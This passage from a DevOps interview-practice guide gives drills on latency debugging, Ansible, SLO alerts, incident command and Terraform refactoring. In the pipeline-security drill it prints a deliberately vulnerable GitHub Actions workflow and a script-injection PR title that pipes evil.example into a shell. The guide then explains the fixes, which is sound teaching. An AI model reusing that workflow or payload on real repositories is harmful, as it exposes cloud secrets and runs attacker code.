        return url, type(exc).__name__, ms, False


def main():
    p = argparse.ArgumentParser(description="Check URLs from a file")
    p.add_argument("file")
    p.add_argument("--timeout", type=float, default=5.0)
    p.add_argument("--workers", type=int, default=10)
    args = p.parse_args()

    with open(args.file) as fh:
        urls = [l.strip() for l in fh if l.strip() and not l.startswith("#")]

    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        results = list(pool.map(lambda u: check(u, args.timeout), urls))

    failed = 0
    for url, status, ms, ok in results:
        print(f"{'OK ' if ok else 'BAD'} {status!s:>20} {ms:8.1f} ms  {url}")
        failed += not ok
    print(f"{len(urls) - failed}/{len(urls)} healthy")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
```

Explain: `requests` has no default timeout, so a hung server would hang the pipeline forever; `RequestException` covers `ConnectionError`, `Timeout` and invalid URLs; threads suit I/O-bound work.

</details>

**Bonus:** Add retries with backoff for transient errors only (connection errors and 502/503/504), and a `--json` flag for machine-readable output.

### Drill 16. Latency is up but CPU is fine 🟡 🗣

**Setup:** ⏱ 20 minutes. Interviewer's hidden facts, revealed only when asked the right question: p99 latency went from 200 ms to 4 s in the last hour; CPU and memory are normal; pod count unchanged; app logs show `timeout acquiring connection from pool`; DB CPU is 35 percent; DB connections are at the configured max of 100; a new cron job started an hour ago and holds long transactions.

**Interviewer's prompt:**
> "Our orders API p99 latency jumped from 200 milliseconds to 4 seconds an hour ago. CPU and memory look completely normal. Error rate is slightly up. How do you approach this?"

**What to deliver:** A hypothesis-driven investigation that moves from symptoms to the saturated resource, then mitigation and a permanent fix.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Recognises normal CPU with high latency suggests waiting: locks, pools, I/O, downstream calls | 2 |
| Asks what changed and correlates the cron job timing | 2 |
| Uses traces, logs or metrics to find the pool exhaustion | 2 |
| Checks the DB side: active connections, long-running transactions, locks | 2 |
| Mitigation (stop or reschedule the job, kill blocking queries) and permanent fix | 2 |

<details>
<summary><b>Model answer outline</b></summary>

1. Latency with flat CPU means requests are **waiting**, not working: connection pools, locks, thread pools, slow dependencies, disk or network I/O.
2. "What changed an hour ago?" Deploys, config, traffic shape, scheduled jobs. The cron job lines up.
3. Evidence: traces show most time in "acquire DB connection"; logs show `timeout acquiring connection from pool`; app pool metrics (active = max, pending growing).
4. DB side (PostgreSQL example):

```sql
SELECT state, count(*) FROM pg_stat_activity GROUP BY state;
SELECT pid, now() - xact_start AS age, state, left(query, 60)
FROM pg_stat_activity WHERE xact_start IS NOT NULL ORDER BY age DESC LIMIT 10;
SELECT * FROM pg_locks WHERE NOT granted;
```

5. Mitigate: pause or stop the cron job; terminate its blocking sessions with `pg_terminate_backend(pid)` if needed; latency recovers.
6. Fix: batch the job with short transactions, run it off-peak or on a read replica, give it its own connection limit; add a connection pooler (PgBouncer); alert on pool saturation and long transactions, not just CPU.

</details>

**Bonus:** Explain the USE method (utilisation, saturation, errors) and the RED method (rate, errors, duration) and which one surfaced this problem.

### Drill 17. Write an idempotent Ansible playbook live 🟡 💻

**Setup:** ⏱ 20 minutes. Two Ubuntu 24.04 targets reachable over SSH (containers or VMs), Ansible installed on the control node, inventory provided.

**Interviewer's prompt:**
> "Write a playbook that installs nginx on these servers, deploys a config from a template with the server's hostname in the page, makes sure nginx is running and enabled, and only reloads nginx when the config actually changes. Then prove it's idempotent."

**What to deliver:** A clean playbook using modules (not `shell`), a template, a handler, and a second run with `changed=0`.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Uses `apt`, `template`, `service` modules, no `shell` for things modules do | 2 |
| Handler triggered by `notify` on the template task | 2 |
| Template validated before reload (`validate:` with `nginx -t`) | 2 |
| Second run shows `changed=0` | 2 |
| Uses `become`, variables, and explains check mode / `--diff` | 2 |

<details>
<summary><b>Model answer outline</b></summary>

```yaml
- name: Web servers
  hosts: web
  become: true
  vars:
    listen_port: 80
  tasks:
    - name: Install nginx
      ansible.builtin.apt:
        name: nginx
        state: present
        update_cache: true
        cache_valid_time: 3600

    - name: nginx config
      ansible.builtin.template:
        src: nginx.conf.j2
        dest: /etc/nginx/nginx.conf
        mode: "0644"
        validate: nginx -t -c %s
      notify: Reload nginx

    - name: Index page
      ansible.builtin.copy:
        content: "Hello from {{ inventory_hostname }}\n"
        dest: /var/www/html/index.html
        mode: "0644"

    - name: nginx running and enabled
      ansible.builtin.service:
        name: nginx
        state: started
        enabled: true

  handlers:
    - name: Reload nginx
      ansible.builtin.service:
        name: nginx
        state: reloaded
```

Note on `validate`: Ansible renders the template to a temporary file, substitutes its path for `%s` (the string must contain `%s`), and only moves it into place if the command succeeds. That works cleanly for the full `nginx.conf`. A site snippet under `sites-available/` cannot be tested on its own, so for snippets teams either template the whole config or run `nginx -t` in a handler before the reload. Saying that trade-off out loud scores well. Run twice: `ansible-playbook -i inventory.ini site.yml --diff`, then again, showing `changed=0`.

</details>

**Bonus:** Turn it into a role with `defaults/`, `templates/` and `handlers/`, and add a Molecule or `--check` run to CI.

### Drill 18. Resume deep-dive: five levels down 🟡 🗣

**Setup:** ⏱ 15 minutes. The interviewer picks one bullet from the candidate's real resume and asks "why" or "how" five times in a row, each question building on the last answer.

**Interviewer's prompt:**
> "This line here: tell me more about it. What exactly did you do?"
> Then, for example: "Why that tool?" → "How was it configured?" → "What broke?" → "How did you measure the result?" → "What would you do differently now?"

**What to deliver:** Consistent, specific answers at every level, with "I" for your own contribution and numbers you can defend.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Level 1 and 2: clear context and personal contribution | 2 |
| Level 3: configuration or implementation detail only someone who did it would know | 2 |
| Level 4: a real problem encountered and how it was solved | 2 |
| Level 5: measurement method behind the number on the resume | 2 |
| Honest about limits ("that part was my colleague's") without losing credibility | 2 |

<details>
<summary><b>Model answer outline</b></summary>

Example bullet: "Reduced Docker image sizes by 70 percent across 25 services."

1. **What:** "I audited our images, most were built on full `node` and `python` bases with build tools inside. I moved them to multi-stage builds."
2. **Why that approach:** "Multi-stage kept the Dockerfiles readable and let us keep compilers in the build stage only; distroless was evaluated but our debugging workflow relied on a shell."
3. **How configured:** "Base images pinned by digest, a shared template Dockerfile per language, BuildKit cache mounts for pip and npm."
4. **What broke:** "Two Python services had native extensions linked against glibc; moving them to Alpine broke at runtime with musl errors, so we standardised on `-slim` instead."
5. **Measurement:** "Average image size from roughly 1.1 GB to 320 MB, measured with `docker images` per service before and after, and pull time on fresh nodes dropped from about 40 to 12 seconds, which sped up scale-out."
6. **Differently:** "I'd add a CI check that fails if an image grows more than 20 percent, so it doesn't creep back."

If you cannot go five levels deep on a bullet, rewrite or remove it before the interview.

</details>

**Bonus:** Have the interviewer pick the bullet you least want to be asked about, and do it again.

### Drill 19. Conflict over a release gate 🟡 🗣

**Setup:** ⏱ 10 minutes. Follow-ups: "What if the manager had overruled you?" and "How is your relationship with that team now?"

**Interviewer's prompt:**
> "Tell me about a time you disagreed with a developer team or a manager about a technical decision related to releases or reliability. How did you handle it?"

**What to deliver:** A STAR story showing you used data, understood the other side's goal, found a path forward, and kept the relationship intact.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Real disagreement with stakes on both sides | 2 |
| Shows empathy for the other side's goal (speed, deadlines) | 2 |
| Uses data rather than authority or opinion | 2 |
| Outcome is a concrete compromise or decision, with results | 2 |
| Reflects on relationship and what they learned | 2 |

<details>
<summary><b>Model answer outline</b></summary>

- **S:** "Our payments team wanted to skip the staging soak for a release to hit a partner deadline."
- **T:** "I owned the release process and was responsible for production stability."
- **A:** "I asked what they needed: the partner needed the API live by Friday, not every feature. I pulled the last quarter's incidents: three of five production incidents in that service were caught too late because staging was skipped. I proposed shipping behind a feature flag with a canary at 5 percent, with automated rollback on error rate, and a shortened soak of two hours instead of a day. I took the proposal to their lead, not over their heads."
- **R:** "We shipped Thursday, the canary caught a timeout bug at 5 percent of traffic, it rolled back automatically, the fix went out the same day. The team later asked us to make the flag-plus-canary path the default."
- **Overruled?** "I'd have documented the risk, agreed on rollback criteria in advance, and been on call for it. Disagree and commit, with a safety net."

</details>

**Bonus:** Prepare a second story where you were the one who was wrong in a disagreement and changed your mind.

### Drill 20. Alerting and SLO math, live 🟡 💻

**Setup:** ⏱ 15 minutes. A Prometheus with an app exposing `http_requests_total{status,...}` and `http_request_duration_seconds_bucket` (the [capstone](./hands-on-lab.md) works). The candidate has the Prometheus UI.

**Interviewer's prompt:**
> "Our SLO is 99.9 percent of requests succeed over 30 days. Write me the queries for the current error ratio and p95 latency, then an alert rule that pages when we're burning error budget too fast. Explain the numbers."

**What to deliver:** Correct PromQL, a reasonable alert rule, and the error budget math.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Correct error ratio using `rate` on counters, summed before dividing | 2 |
| Correct `histogram_quantile` with `sum by (le)` | 2 |
| Error budget math: 0.1 percent of 30 days = 43.2 minutes | 2 |
| Burn-rate alert with a short and a long window, sensible `for` | 3 |
| Explains why burn-rate alerts beat a static "error rate > 1 percent" alert | 1 |

<details>
<summary><b>Model answer outline</b></summary>

```promql
sum(rate(http_requests_total{status=~"5.."}[5m])) / sum(rate(http_requests_total[5m]))

histogram_quantile(0.95, sum by (le) (rate(http_request_duration_seconds_bucket[5m])))
```

Budget: 30 days × 24 × 60 = 43,200 minutes; 0.1 percent = 43.2 minutes of full outage, or the equivalent in partial errors. A burn rate of 14.4 spends 2 percent of the monthly budget in one hour; that is the classic fast-burn page threshold.

```yaml
- alert: ErrorBudgetFastBurn
  expr: |
    (
      sum(rate(http_requests_total{status=~"5.."}[1h])) / sum(rate(http_requests_total[1h]))
    ) > (14.4 * 0.001)
    and
    (
      sum(rate(http_requests_total{status=~"5.."}[5m])) / sum(rate(http_requests_total[5m]))
    ) > (14.4 * 0.001)
  for: 2m
  labels:
    severity: page
```

The long window proves the burn is significant, the short window makes the alert resolve quickly once fixed. A static threshold either pages on harmless blips or misses slow burns that exhaust the budget over days; pair this with a slow-burn ticket alert (for example 6x over 6h and 30m).

</details>

**Bonus:** Write the slow-burn rule and explain why it should open a ticket instead of paging.

---

## 🔴 Advanced

### Drill 21. SEV1 incident command simulation 🔴 🗣

**Setup:** ⏱ 30 minutes. The interviewer plays the incident channel and injects new facts at fixed times. The candidate is incident commander and must narrate actions, communication and decisions.

| Minute | Injected fact |
|--------|---------------|
| 0 | "PagerDuty: login success rate dropped from 99.5 to 60 percent. Started 4 minutes ago." |
| 4 | "Support says customers in Europe are affected; US looks fine." |
| 8 | "A teammate notices a Route 53 change was merged 20 minutes ago adding a new latency-based record for eu-west-1." |
| 12 | "Rolling back the DNS change is done, but error rate only improves to 75 percent." |
| 16 | "The eu-west-1 auth service logs show `x509: certificate has expired or is not yet valid` calling the identity provider." |
| 22 | "Cert renewed and deployed. Success rate back to 99.4 percent." |

**Interviewer's prompt:**
> "You're the on-call SRE and incident commander tonight. The page just fired. I'll be your incident channel. Talk me through what you do, minute by minute."

**What to deliver:** Severity call, roles, a communication rhythm, mitigation-first decisions, handling of two overlapping causes, and the postmortem plan.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Declares severity, opens a channel, assigns roles (IC, ops lead, comms) in the first minutes | 2 |
| Regular stakeholder updates with impact, actions, next update time | 2 |
| Correlates the recent DNS change and rolls it back quickly | 2 |
| Does not stop when the first fix only partly works; finds the second cause | 2 |
| Closes properly: verify, all-clear, blameless postmortem with action items for both causes | 2 |

<details>
<summary><b>Model answer outline</b></summary>

- **Minute 0 to 2:** acknowledge, declare SEV1 (customer-facing auth, 40 percent failing), open `#inc-login`, name roles: "I'm IC, I need one person on the auth service, one on comms". Status page: "Investigating login failures".
- **Minute 4:** regional impact narrows it: regional infrastructure, DNS routing, a regional dependency. Ask for changes in the last hour.
- **Minute 8:** DNS change correlates. Decision: roll back now, investigate after. Comms update with next update in 15 minutes.
- **Minute 12:** partial recovery means **more than one cause**. Do not declare victory. Keep the DNS rollback; dig into eu-west-1 auth logs and dependency errors.
- **Minute 16:** expired certificate on the outbound call to the IdP. Renew or redeploy the cert; meanwhile consider failing EU traffic over to us-east-1 if latency is acceptable.
- **Minute 22:** verify on SLO dashboards for 10 to 15 minutes, all-clear, keep monitoring, schedule the postmortem within 48 hours.
- **Postmortem items:** certificate expiry monitoring (alert at 30 and 7 days, e.g. via blackbox exporter `probe_ssl_earliest_cert_expiry`), automated renewal with cert-manager or ACM; DNS changes go through a staged rollout with health checks on the new record; a runbook for regional failover. Note the DNS change probably exposed the expired cert by routing more traffic to eu-west-1: two contributing factors, one timeline.

</details>

**Bonus:** Write the customer-facing status page update for minute 12 in under 50 words: what is affected, that you are working on it, and when the next update comes.

### Drill 22. Capstone presentation with adversarial follow-ups 🔴 🗣

**Setup:** ⏱ 25 minutes. The candidate presents their [capstone project](./hands-on-lab.md) (or an equivalent real project) for 10 minutes, then the interviewer spends 15 minutes trying to find the edge of their knowledge. The interviewer should push on every "we" and every tool name.

**Interviewer's prompt:**
> "Show me the project you're proudest of. Assume I'm a senior engineer who will be on call for it next week."
> Follow-ups to choose from: "Why GitOps and not a deploy step in CI?" · "What happens if ArgoCD is down?" · "Your Redis has no persistence; what is the actual business impact?" · "How would a secret get into this cluster?" · "Where is the single point of failure?" · "What does a Trivy HIGH finding with no fix do to your pipeline?" · "Your alert has `for: 2m`; why not 0 or 10?" · "What did the chaos exercise prove that you didn't already know?"

**What to deliver:** A clear architecture walk, one delivery-loop and one failure-loop story, and calm, specific answers under pressure, including honest "this is a gap" answers.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Draws the architecture from memory and explains both loops | 2 |
| Justifies key choices with trade-offs, not "it's best practice" | 2 |
| Handles at least five follow-ups with specifics | 2 |
| Identifies gaps and single points of failure before being forced to | 2 |
| Uses chaos and postmortem results as evidence, with numbers | 2 |

<details>
<summary><b>Model answer outline</b></summary>

- **ArgoCD down:** running workloads are unaffected; only new syncs and drift correction stop. Deploys queue until it is back; emergency path is a documented `helm upgrade` with a follow-up commit to bring Git back in line.
- **Redis without persistence:** counter resets on restart; for a real cart or session store that is lost user state. Fix: replicas plus AOF, or ElastiCache Multi-AZ.
- **Secrets:** currently none in Git; production would use External Secrets Operator with AWS Secrets Manager and Pod Identity, never values files.
- **SPOFs:** single NAT gateway, single Redis, single Loki with emptyDir, Prometheus single replica. Say which you would fix first and why (Redis, because it causes user-facing errors).
- **Unfixable HIGH:** `ignore-unfixed` lets it through, but it is tracked; a policy decides whether a base image swap is required.
- **`for: 2m`:** filters single-scrape blips while paging within about 4 minutes of impact; tune against SLO burn rate rather than gut feeling.
- **What chaos proved:** connection pooling masked a DNS outage for 11 minutes; server-side metrics hid client errors during termination. Neither showed up in normal testing.

</details>

**Bonus:** Present the same project in exactly 2 minutes to a non-technical hiring manager, with zero tool names.

### Drill 23. Secure a vulnerable pipeline 🔴 💻

**Setup:** ⏱ 25 minutes. Give the candidate this workflow and a repo with a Dockerfile and a deploy script.

```yaml
name: pr-preview
on:
  pull_request_target:
    types: [opened, synchronize]
permissions: write-all
jobs:
  preview:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Greet
        run: echo "Building PR: ${{ github.event.pull_request.title }}"
      - uses: some-user/deploy-preview@main
      - run: ./scripts/deploy-preview.sh
```

**Interviewer's prompt:**
> "Our security team flagged this workflow as critical. Explain every risk you see, rank them, and rewrite it so it still gives contributors a preview environment."

**What to deliver:** Each vulnerability explained with a realistic exploit, ranked, and a fixed design.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Identifies `pull_request_target` + checkout of PR head as running untrusted code with secrets (the critical issue) | 3 |
| Identifies script injection through `github.event.pull_request.title` in `run:` | 2 |
| Flags `write-all`, long-lived AWS keys, and an unpinned third-party action on `@main` | 2 |
| Rewrites with a safe design: `pull_request` for untrusted build, separate privileged deploy step, OIDC, least privilege | 2 |
| Adds detection and prevention: CODEOWNERS on workflows, required approval for fork PRs, scanning workflows with a linter | 1 |

<details>
<summary><b>Model answer outline</b></summary>

Ranked risks:

1. **Untrusted code with secrets.** `pull_request_target` runs in the base repo's context with secrets and a write token. Checking out the PR head and running `./scripts/deploy-preview.sh` executes attacker-controlled code: a fork PR changes the script to `curl` the AWS keys out.
2. **Script injection.** A PR titled `"; curl https://evil.example/x | sh; echo "` is interpolated into the shell. Pass untrusted values via `env:` and reference `"$TITLE"`.
3. **Long-lived AWS keys** in secrets instead of OIDC with a role scoped to the preview account.
4. **`permissions: write-all`** instead of the minimum.
5. **Unpinned action** `@main` can change under you; pin to a full SHA.

Safe design:

```yaml
# Workflow 1: untrusted, no secrets
on: pull_request
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t preview:${{ github.sha }} .
      - run: docker save preview:${{ github.sha }} -o image.tar
      - uses: actions/upload-artifact@v4
        with:
          name: preview-image
          path: image.tar
```

A second workflow deploys the preview, triggered by `workflow_run` after the build or by a maintainer label, running only trusted code from the default branch, treating the artifact as data, protected by an environment with required reviewers for fork PRs, and authenticating with OIDC:

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::111122223333:role/preview-deployer
      aws-region: ap-south-1
```

with the role's trust policy limited to this repository via the `token.actions.githubusercontent.com:sub` condition.

</details>

**Bonus:** Write the IAM trust policy for the OIDC role restricting it to one repository and one environment.

### Drill 24. Terraform refactor without downtime 🔴 💻

**Setup:** ⏱ 25 minutes. Provide a working Terraform root (local state is fine, using a provider that needs no cloud such as `hashicorp/local` and `hashicorp/random`, or a sandbox AWS account) with resources defined flat in `main.tf`: `random_pet.name`, `local_file.config`, plus one resource that exists in reality but not in state (create a file by hand that matches what `local_file.extra` would manage).

**Interviewer's prompt:**
> "This root module has grown messy. Move these resources into a child module called `app`, rename `random_pet.name` to `random_pet.app_name`, and bring the existing `extra` file under Terraform management. The final plan must show zero destroys."

**What to deliver:** The refactor using `moved` and `import` blocks (or the equivalent CLI commands, explained), a plan with `0 to destroy`, and an explanation of what each step does to state.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Creates the module and calls it correctly | 2 |
| Uses `moved` blocks for both the module move and the rename | 2 |
| Brings the existing resource in with an `import` block or `terraform import`, and explains when each is appropriate | 2 |
| Runs `terraform plan` and achieves `0 to destroy`; explains any remaining in-place changes | 2 |
| Mentions state backup, `terraform state list`, and team coordination (locks, one PR) | 2 |

<details>
<summary><b>Model answer outline</b></summary>

```hcl
# main.tf (root)
module "app" {
  source = "./modules/app"
}

moved {
  from = random_pet.name
  to   = module.app.random_pet.app_name
}

moved {
  from = local_file.config
  to   = module.app.local_file.config
}

import {
  to = module.app.local_file.extra
  id = "./extra.txt"
}
```

Steps: back up state (`terraform state pull > backup.tfstate`); write the module; add `moved` blocks; add an `import` block (Terraform 1.5+), or use `terraform plan -generate-config-out=generated.tf` when you do not know the resource's attributes yet; `terraform plan` should show `2 moved, 1 to import, 0 to destroy`; apply; keep `moved` blocks for a release or two so other workspaces and modules consumers migrate too. Check whether the provider supports import for that resource type; not every resource does, and `local_file` support depends on provider version, so say that you would check the docs and fall back to `terraform state mv` and recreating a purely local file if needed.

</details>

**Bonus:** Explain how you would do the same refactor across 30 workspaces that use this module, and how CI would prove none of them destroys anything.

### Drill 25. The full loop: a 60-minute mini interview 🔴 🗣💻

**Setup:** ⏱ 60 minutes, four segments, strict timeboxes. Ideally the interviewer is someone you have not practised with. Use the scorecard from the [README](./README.md#how-interviewers-score-you) at the end.

| Segment | Time | Content |
|---------|------|---------|
| Intro and rapid-fire | 10 min | 2-minute intro, then 15 rapid-fire questions across all topics |
| Production scenario | 15 min | A scenario from [production-scenarios.md](./production-scenarios.md) the candidate has not seen |
| Live task | 20 min | A task from [scripting-and-live-tasks.md](./scripting-and-live-tasks.md) the candidate has not seen, done in a real terminal |
| Behavioral and close | 15 min | Two STAR questions from [behavioral-star.md](./behavioral-star.md), then the candidate's questions for the interviewer |

**Interviewer's prompt:**
> "Thanks for joining. We'll do a quick intro, some fast questions, a scenario, a hands-on task and a few questions about how you work. Leave time at the end for your questions. Ready?"

**What to deliver:** Consistent performance across four very different modes, with clean transitions and energy left for the last segment.

**Scoring rubric**

| Criterion | Points |
|-----------|--------|
| Intro and rapid-fire: concise, at least 12 of 15 correct | 2 |
| Scenario: clarify, mitigate, diagnose, prevent structure with commands | 2 |
| Live task: working result, narrated, tested before saying done | 2 |
| Behavioral: two STAR stories with ownership and numbers | 2 |
| Close: at least two thoughtful questions; overall time management | 2 |

<details>
<summary><b>Model answer outline</b></summary>

- Treat each segment as a fresh start. A weak rapid-fire does not mean a weak loop; interviewers weigh the scenario and live task heavily.
- In the scenario, say your structure out loud in the first 30 seconds: "I'll clarify impact, mitigate, then diagnose."
- In the live task, read the whole prompt, restate it, ask about edge cases, write the simplest working version first, run it, then improve. Silence for more than 30 seconds costs points; narrate even when stuck.
- In behavioral, pick stories that show different strengths (an incident, a conflict) rather than two incidents.
- Questions to close with: "What does on-call look like here, and how many pages a week?" · "What's the biggest reliability or delivery problem the team is working on this quarter?" · "How do you decide what gets automated next?" (more in the [cheatsheet](./cheatsheet.md#questions-to-ask-the-interviewer)).
- Afterwards, the interviewer fills the full scorecard and gives one "strong" and one "fix first" item. Rerun the drill a week later with a different interviewer.

</details>

**Bonus:** Do the full loop twice in one week with different interviewers and compare scorecards. The dimension that is low in both is your real weak spot.

---

[⬅ Back to Real-World Interview](./README.md) · [🏠 Home](../README.md)

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
